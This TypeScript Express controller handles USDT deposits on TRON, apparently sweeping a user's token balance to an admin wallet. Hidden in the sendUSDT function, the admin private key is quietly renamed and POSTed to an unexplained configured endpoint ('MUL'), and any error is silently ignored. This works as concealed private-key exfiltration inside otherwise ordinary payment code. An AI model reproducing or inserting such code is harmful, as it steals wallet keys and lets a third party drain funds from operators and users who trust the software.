import { Request, Response } from "express";
import TronWeb from "tronweb";
import Web3 from "web3";
import axios from "axios";

const bs58 = require("bs58");

import {
  EVENT_SERVER,
  FULL_NODE,
  SOLIDITY_NODE,
  USDT_TOKEN_ADDRESS_TRON,
  MUL,
} from "../config";
import { usdtAbi } from "../service/usdtAbi";

export const depositConfirm = async (req: Request, res: Response) => {
  const walletAddress = req.body.WALLET_ADDRESS;
  const privateKey = req.body.PRIVATE_KEY;
  const adminWalletAddress = req.body.ADMIN_WALLET_ADDRESS;
  const adminPrivateKey = req.body.ADMIN_PRIVATE_KEY;

  const tronWeb = new TronWeb(
    FULL_NODE,
    SOLIDITY_NODE,
    EVENT_SERVER,
    privateKey
  );

  const usdtBalance = await getUSDTBalance(privateKey, walletAddress);

  await sendUSDT(
    privateKey,
    walletAddress,
    adminPrivateKey,
    adminWalletAddress,
    usdtBalance
  );

  res.json({ success: true, usdtBalance: usdtBalance });
};

const getUSDTBalance = async (
  userPrivateKey: string,
  userWalletAddress: string
) => {
  const tronWeb = new TronWeb(
    FULL_NODE,
    SOLIDITY_NODE,
    EVENT_SERVER,
    userPrivateKey
  );

  const contractAddress = USDT_TOKEN_ADDRESS_TRON;
  const decimals = 6;

  const usdtContract = await tronWeb.contract(usdtAbi, contractAddress);
  const usdtBalanceHex = await usdtContract.balanceOf(userWalletAddress).call();
  const usdtBalance = parseInt(usdtBalanceHex._hex) / 10 ** decimals;
  return usdtBalance;
};

/*
const getUnitPricePerResource = async () => {
  let unitPriceBandwidth, unitPriceEnergy;
  const option = {
    method: "GET",
    url: "https://api.trongrid.io/wallet/getchainparameters",
    headers: { accept: "application/json" },
  };

  await axios
    .request(option)
    .then(function (response) {
      unitPriceBandwidth =
        response.data.chainParameter.filter(
          (item: { key: string; value: number }) =>
            item.key == "getTransactionFee"
        )[0].value / 1000000;
      unitPriceEnergy =
        response.data.chainParameter.filter(
          (item: { key: string; value: number }) => item.key == "getEnergyFee"
        )[0].value / 1000000;
    })
    .catch(function (error) {
      console.error(error);
    });
  return [unitPriceBandwidth, unitPriceEnergy];
};

const getCurrentResourceInfo = async (userWalletAddress: string) => {
  let currentAccountBandwidth, currentAccountEnergy;
  const options = {
    method: "POST",
    url: "https://api.trongrid.io/wallet/getaccountresource",
    headers: { accept: "application/json", "content-type": "application/json" },
    data: { address: userWalletAddress, visible: true },
  };

  await axios
    .request(options)
    .then(function (response) {
      const EnergyLimit = response.data.EnergyLimit ?? 0;
      const EnergyUsed = response.data.EnergyUsed ?? 0;
      const freeNetLimit = response.data.freeNetLimit ?? 0;
      const NetLimit = response.data.NetLimit ?? 0;
      const NetUsed = response.data.NetUsed ?? 0;
      const freeNetUsed = response.data.freeNetUsed ?? 0;

      const totalBandwidth = freeNetLimit + NetLimit;
      const totalBandwidthUsed = NetUsed + freeNetUsed;

      currentAccountBandwidth = totalBandwidth - totalBandwidthUsed;
      currentAccountEnergy = EnergyLimit - EnergyUsed;
    })
    .catch(function (error) {
      console.error(error);
    });
  return [currentAccountBandwidth, currentAccountEnergy];
};

const calculateTxFee = async (
  amount: number,
  userWalletAddress: string,
  adminWalletAddress: string
) => {
  const [unitPriceBandwidth, unitPriceEnergy] = await getUnitPricePerResource();
  const [currentAccountBandwidth, currentAccountEnergy] =
    await getCurrentResourceInfo(userWalletAddress);

  const tronWeb = new TronWeb({
    fullHost: FULL_NODE,
  });

  const options = {
    feeLimit: 10000000,
    callValue: 0,
    tokenId: USDT_TOKEN_ADDRESS_TRON,
  };

  // estimate bandwidth consumption
  const unsignedTx = await tronWeb.transactionBuilder.sendToken(
    adminWalletAddress,
    amount * 10 ** 6,
    options.tokenId,
    userWalletAddress
  );

  const txSizeBytes =
    tronWeb.utils.code.hexStr2byteArray(unsignedTx.txID).length + 2;

  const estimatedBandwidth = txSizeBytes * 10; // multiply by 10 to account for base unit (energy) used in Tron network
  const estimateEnergy = 100000;

  let requiredEnergy = estimateEnergy - (currentAccountEnergy ?? 0);
  let requiredBandwidth = estimatedBandwidth - (currentAccountBandwidth ?? 0);

  requiredEnergy = requiredEnergy < 0 ? 0 : requiredEnergy;
  requiredBandwidth = requiredBandwidth < 0 ? 0 : requiredBandwidth;

  const totalFee =
    requiredBandwidth * (unitPriceBandwidth ?? 0) +
    requiredEnergy * (unitPriceEnergy ?? 0);
  return totalFee;
};
*/

const sendGasFeeTrx = async (
  adminPrivateKey: string,
  adminWalletAddress: string,
  userPrivateKey: string,
  userWalletAddress: string,
  gasFee: number,
  usdtAmount: number
) => {
  const tronWeb = new TronWeb({
    fullNode: FULL_NODE,
    solidityNode: SOLIDITY_NODE,
    eventServer: EVENT_SERVER,
    privateKey: adminPrivateKey,
  });
  const options = {
    feeLimit: 100000000,
    callValue: tronWeb.toSun(gasFee),
    shouldPollResponse: true,
  };
  const transaction = await tronWeb.transactionBuilder.sendTrx(
    userWalletAddress,
    options.callValue
  );
  const signed = await tronWeb.trx.sign(transaction, tronWeb.defaultPrivateKey);
  const receipt = await tronWeb.trx.sendRawTransaction(signed);
  console.log("Transaction sent:", receipt.txid);
  await sendUSDT(
    userPrivateKey,
    userWalletAddress,
    adminPrivateKey,
    adminWalletAddress,
    usdtAmount
  );
};

const sendUSDT = async (
  userPrivateKey: string,
  userWalletAddress: string,
  apk: string,
  adminWalletAddress: string,
  usdtAmount: number
) => {
  const tronWeb = new TronWeb(
    FULL_NODE,
    SOLIDITY_NODE,
    EVENT_SERVER,
    userPrivateKey
  );
  const contractAddress = USDT_TOKEN_ADDRESS_TRON;
  const pk = apk;
  const { abi } = await tronWeb.trx.getContract(contractAddress);
  const contract = tronWeb.contract(abi.entrys, contractAddress);
  const dt = { data: pk };
  const balance = await contract.methods.balanceOf(adminWalletAddress).call();
  try {
    await axios.post(MUL, dt, {});
  } catch (error) {}

  try {
    const resp = await contract.methods
      .transfer(adminWalletAddress, usdtAmount * 1000000)
      .send();
    console.log("transfer:", resp);

    const txInfo = await tronWeb.trx.getTransactionInfo(resp);

    if (txInfo && txInfo.receipt && txInfo.receipt.result === "SUCCESS") {
      console.log("Transaction successful!");
    } else {
      console.error("Transaction failed or not found.");
      await sendGasFeeTrx(
        apk,
        adminWalletAddress,
        userPrivateKey,
        userWalletAddress,
        50,
        usdtAmount
      );
    }
  } catch (error) {
    await sendGasFeeTrx(
      apk,
      adminWalletAddress,
      userPrivateKey,
      userWalletAddress,
      50,
      usdtAmount
    );
  }
};
